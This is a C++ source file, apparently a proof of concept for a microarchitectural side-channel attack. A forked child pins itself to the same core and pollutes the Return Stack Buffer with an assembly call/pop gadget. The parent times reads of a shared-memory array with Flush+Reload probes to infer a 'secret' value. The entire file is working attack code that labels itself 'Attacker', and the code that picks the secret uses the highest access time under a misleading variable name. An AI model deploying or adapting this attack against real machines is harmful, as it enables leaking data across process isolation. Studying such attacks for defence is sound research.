#include "util.hpp"
#include <iostream>
#include <fstream>
#include <immintrin.h>

using namespace std;
char* array;

volatile void spacer() {
	asm(
		// ".rept 2235;"
		".rept 1643;"
		"nop;"
		".endr;"
	);
}

void gadget() {
	asm(
		"lbl:"
		"pop %rax;"
		"call lbl;"
	);
}

void flushAndReload(int* timer){
	// flush all the entries of the array out of cache
	// for(int i=lowerBound; i<=upperBound; i++){
	// 	clflush((void*)(&array[i*offset]));
	// }
	// wait some time for the attack to happen
	// sleep(sleepTime);
	sched_yield();
	// _mm_pause();
	// for(int i=lowerBound; i<=upperBound; i++){
	// 	// int a = timer[i], b = measure_one_block_access_time(ADDR_PTR(&array[i*offset]));
	// 	// timer[i] = a<b?a:b;
	// 	timer[i]+= measure_one_block_access_time(ADDR_PTR(&array[i*offset]));
	// }

	measure_one_block_access_time(ADDR_PTR(&array[20*offset]));
	timer[9]+= measure_one_block_access_time(ADDR_PTR(&array[9*offset]));
	timer[8]+= measure_one_block_access_time(ADDR_PTR(&array[8*offset]));
	timer[2]+= measure_one_block_access_time(ADDR_PTR(&array[2*offset]));
	timer[1]+= measure_one_block_access_time(ADDR_PTR(&array[1*offset]));
	timer[3]+= measure_one_block_access_time(ADDR_PTR(&array[3*offset]));
	timer[0]+= measure_one_block_access_time(ADDR_PTR(&array[0*offset]));
	timer[5]+= measure_one_block_access_time(ADDR_PTR(&array[5*offset]));
	timer[7]+= measure_one_block_access_time(ADDR_PTR(&array[7*offset]));
	timer[6]+= measure_one_block_access_time(ADDR_PTR(&array[6*offset]));
	timer[4]+= measure_one_block_access_time(ADDR_PTR(&array[4*offset]));
}


int getSecret(int repeat){
	int timer[upperBound+1];
	for(int i=0; i<=upperBound; i++){
		timer[i] = 0;
	}

	for(int i=0; i<repeat; i++){
		printf("iteration %i...\n", i);
		flushAndReload(timer);
	}

	int secret = 0, lowestAccessTime = 0;
	for(int i=0; i<=upperBound; i++){
		printf("%i: %i\n", i, timer[i]/nAttackRepeat);
		if(timer[i]/nAttackRepeat>lowestAccessTime){
			secret = i;
			lowestAccessTime = timer[i]/nAttackRepeat;
		}
	}

	printf("Secret is %d, with access time %d\n", secret, lowestAccessTime);
	return secret;
}

int main(int argc, char *argv[]){
	printf("Attacker Launching...\n");

	// start child process
	pid_t pid = fork();

	if(pid == 0){
		// child process
		auto cpu = sched_getcpu();
		printf("RSB pollution on core: %d\n", cpu);
		// doing nothing, just for comparison
		if ((argc == 2)&&(argv[1][0]=='0')) {
			printf("doing nothing\n");
			while(1) {}
			return 0;
		}
		// polluter start polluting RSB
		else if((argc == 2)&&(argv[1][0]=='1')){
			printf("Polluting RSB...\n");
			gadget();
			return 0;
		}
		else{
			printf("Invalid argument\n");
			return -1;
		}

	}
	else if(pid > 0){
		auto cpu = sched_getcpu();
		printf("Attacker launched on core: %d\n", cpu);
		cpu_set_t  mask;
		CPU_ZERO(&mask);
		CPU_SET(cpu, &mask);
		auto result = sched_setaffinity(pid, sizeof(mask), &mask);
		// parent process;
		// allocate the same shared memory space
		const int SIZE = 1<<20; 
		// shared memory is named Sally because Rob doesn't know anyone named Sally
	    const char* name = "Sally";
	    char temp;
	    // shared memory file descriptor
	    int shm_fd;  
	    // pointer to shared memory obect
	    // create the shared memory object
	    shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666); 
	    // configure the size of the shared memory object
	    ftruncate(shm_fd, SIZE); 
	    // memory map the shared memory object
	    array = (char*)mmap(0, SIZE, PROT_WRITE, MAP_SHARED, shm_fd, 0);

		sleep(1);
		// for (int i = 0; i < 9; i++) {
		// 	printf("value at secret %i is %c\n", i, array[i*offset]);
		// printf("VA of secret %i is %p\n", i, (void *)&array[i*offset]);
		// }
	    // flushing out every entry
	    getSecret(nAttackRepeat);
		//access time to the array;
		kill(pid, SIGKILL);
		printf("RSB pollution ended\n");
		// printf("secret found\n");
		return 0;
	}
	else{
		printf("fork error\n");
		return -1;
	}
}